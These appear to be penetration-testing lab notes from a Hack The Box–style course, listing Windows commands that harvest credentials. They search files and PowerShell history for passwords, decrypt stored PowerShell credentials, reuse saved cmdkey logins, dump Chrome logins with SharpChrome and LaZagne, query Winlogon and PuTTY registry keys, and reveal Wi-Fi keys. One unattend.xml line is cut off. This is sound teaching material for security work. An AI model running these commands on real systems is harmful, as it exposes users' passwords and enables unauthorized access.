#### Searching for Files

```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
#### Chrome Dictionary Files

Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```bash
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
#### Unattended Installation Files

Search for `unattend.xml
#### PowerShell History File

Confirm location:

```bash
(Get-PSReadLineOption).HistorySavePath
```

Read:

```bash
gc (Get-PSReadLineOption).HistorySavePath
```
#### Decrypting PowerShell Credentials

```bash
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

#### Cmdkey

```bash
 cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

To use:

```bash
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
#### Chrome

```bash
.\SharpChrome.exe logins /unprotect
```
#### LaZagne

```bash
.\lazagne.exe all
```
#### Registries

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
````
#### WiFi

```bash
netsh wlan show profile
netsh wlan show profile <profile_name> key=clear
```




